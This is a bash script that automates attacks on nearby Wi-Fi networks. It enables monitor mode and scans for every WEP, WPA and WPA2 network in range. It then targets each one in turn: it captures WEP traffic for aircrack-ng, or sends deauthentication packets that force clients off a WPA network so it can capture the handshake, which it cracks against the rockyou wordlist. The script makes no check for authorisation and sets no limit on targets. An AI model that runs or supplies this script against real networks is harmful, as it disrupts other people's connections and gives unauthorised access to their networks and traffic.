#!/bin/bash

# Function to handle failures gracefully
die() {
    echo "[!] $1"
    exit 1
}

# Identify the wireless interface
echo "[*] Identifying wireless interface..."
iface=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)

if [ -z "$iface" ]; then
    die "No wireless interface found. Exiting..."
fi

# Start monitor mode
echo "[*] Setting up monitor mode on $iface..."
sudo airmon-ng start $iface || die "Failed to start monitor mode on $iface. Exiting..."
monitor_iface="${iface}mon"

# Capture networks
echo "[*] Scanning for local networks..."
sudo airodump-ng -w network_scan --output-format csv $monitor_iface & 
sleep 10
sudo pkill airodump-ng

if [ ! -f "network_scan-01.csv" ]; then
    die "Network scan file not found. Exiting..."
fi

# Filter and prioritize networks by security level
echo "[*] Filtering networks..."
networks=$(grep -E ",WEP|WPA|WPA2," network_scan-01.csv | sort -t ',' -k 6)
if [ -z "$networks" ]; then
    die "No suitable networks found for cracking. Exiting..."
fi

# Loop through networks by security level
while read -r network; do
    bssid=$(echo "$network" | cut -d ',' -f 1)
    essid=$(echo "$network" | cut -d ',' -f 14)
    encryption=$(echo "$network" | cut -d ',' -f 6)
    channel=$(echo "$network" | cut -d ',' -f 4 | tr -d ' ')

    if [ -z "$bssid" ] || [ -z "$channel" ] || [ -z "$encryption" ]; then
        echo "[!] Skipping invalid network entry..."
        continue
    fi
    
    echo "[*] Targeting $essid ($bssid) on channel $channel - $encryption"
    
    # Set interface to correct channel
    sudo iwconfig $monitor_iface channel $channel
    if [ $? -ne 0 ]; then
        echo "[!] Failed to set channel $channel on $monitor_iface. Skipping..."
        continue
    fi
    
    if [[ $encryption == *WEP* ]]; then
        echo "[*] Attempting WEP crack..."
        sudo airodump-ng --bssid $bssid -c $channel -w wep_capture $monitor_iface &
        sleep 60
        sudo pkill airodump-ng
        if [ -f "wep_capture-01.cap" ]; then
            sudo aircrack-ng -z -b $bssid wep_capture*.cap || echo "[!] Failed to crack WEP on $bssid."
        else
            echo "[!] Capture file for WEP cracking not found. Skipping..."
        fi
    elif [[ $encryption == *WPA* || $encryption == *WPA2* ]]; then
        echo "[*] Attempting WPA/WPA2 handshake capture..."
        sudo airodump-ng --bssid $bssid -c $channel -w wpa_capture $monitor_iface &
        sleep 30
        
        # Find a connected client to target
        client=$(awk -F',' '/Station MAC/{getline; print $1}' wpa_capture-01.csv | tr -d ' ' | head -n 1)
        
        if [ -n "$client" ]; then
            echo "[*] Found connected client: $client"
            # Send deauth packets to specific client
            echo "[*] Sending deauth packets to client $client on BSSID $bssid..."
            sudo aireplay-ng --deauth 10 -a $bssid -c $client $monitor_iface
            if [ $? -ne 0 ]; then
                echo "[!] Failed to send deauth packets to client $client on BSSID $bssid. Skipping..."
            fi
        else
            echo "[*] No connected clients found. Sending broadcast deauth packets..."
            sudo aireplay-ng --deauth 10 -a $bssid $monitor_iface
            if [ $? -ne 0 ]; then
                echo "[!] Failed to send broadcast deauth packets to BSSID $bssid. Skipping..."
            fi
        fi

        sleep 60
        sudo pkill airodump-ng
        
        if [ -f "wpa_capture-01.cap" ]; then
            if [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
                echo "[!] Wordlist file not found. Please provide a valid wordlist at /usr/share/wordlists/rockyou.txt. Skipping..."
                continue
            fi
            sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $bssid -e "$essid" wpa_capture*.cap || echo "[!] Failed to crack WPA/WPA2 on $bssid."
        else
            echo "[!] Capture file for WPA/WPA2 cracking not found. Skipping..."
        fi
    else
        echo "[!] Unsupported encryption type. Skipping..."
    fi

done <<< "$networks"

# Stop monitor mode
echo "[*] Cleaning up..."
sudo airmon-ng stop $monitor_iface
if [ $? -ne 0 ]; then
    echo "[!] Failed to stop monitor mode on $monitor_iface. Please stop it manually."
else
    echo "[*] Monitor mode stopped successfully."
fi
